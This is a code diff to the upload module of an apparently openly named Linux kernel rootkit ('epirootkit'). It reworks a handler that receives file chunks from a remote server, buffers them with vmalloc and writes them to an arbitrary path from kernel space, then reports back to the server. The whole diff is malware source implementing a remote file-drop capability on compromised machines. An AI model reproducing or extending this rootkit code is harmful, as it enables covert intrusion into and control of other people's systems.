@@ -1,10 +1,11 @@
+#include "upload.h"
+
 #include <linux/fs.h>
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
 #include "epirootkit.h"
-#include "upload.h"
 
 bool receiving_file = false;
 char *upload_buffer = NULL;
@@ -13,20 +14,27 @@ long upload_size = 0;
 long upload_received = 0;
 
 int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol) {
+    size_t to_copy;
+    size_t i;
+
+    DBG_MSG("CHUNK SIZE : %zu\n", len);
+
     if (!receiving_file || !upload_buffer) {
         ERR_MSG("handle_upload_chunk: not receiving file, aborting chunk\n");
         return -EINVAL;
     }
 
-    size_t to_copy = len;
     if (upload_received + len > upload_size)
         to_copy = upload_size - upload_received;
+    else
+        to_copy = len;
 
-    memcpy(upload_buffer + upload_received, data, to_copy);
+    for (i = 0; i < to_copy; i++) {
+        upload_buffer[upload_received + i] = data[i];
+    }
     upload_received += to_copy;
 
-    DBG_MSG("handle_upload_chunk: received %zu bytes (%ld/%ld)\n",
-            to_copy, upload_received, upload_size);
+    DBG_MSG("handle_upload_chunk: received %zu bytes (%ld/%ld)\n", to_copy, upload_received, upload_size);
 
     if (upload_received >= upload_size) {
         DBG_MSG("handle_upload_chunk: full upload received, writing to file\n");
@@ -35,19 +43,21 @@ int handle_upload_chunk(const char *data, size_t len, enum Protocol protocol) {
         if (IS_ERR(filp)) {
             ERR_MSG("handle_upload_chunk: failed to open %s\n", upload_path);
             send_to_server(protocol, "Failed to open file.\n");
-        } else {
+        }
+        else {
             ssize_t written = kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
             if (written != upload_size) {
                 ERR_MSG("handle_upload_chunk: partial write (%zd/%ld)\n", written, upload_size);
                 send_to_server(protocol, "Partial or failed file write.\n");
-            } else {
+            }
+            else {
                 DBG_MSG("handle_upload_chunk: wrote %ld bytes to %s\n", upload_size, upload_path);
                 send_to_server(protocol, "File written successfully.\n");
             }
             filp_close(filp, NULL);
         }
 
-        kfree(upload_buffer);
+        vfree(upload_buffer);
         kfree(upload_path);
         upload_buffer = NULL;
         upload_path = NULL;
@@ -69,7 +79,7 @@ int start_upload(const char *path, long size) {
 
     upload_path[strcspn(upload_path, "\n")] = '\0';
 
-    upload_buffer = kmalloc(size, GFP_KERNEL);
+    upload_buffer = vmalloc(size);
     if (!upload_buffer) {
         kfree(upload_path);
         return -ENOMEM;
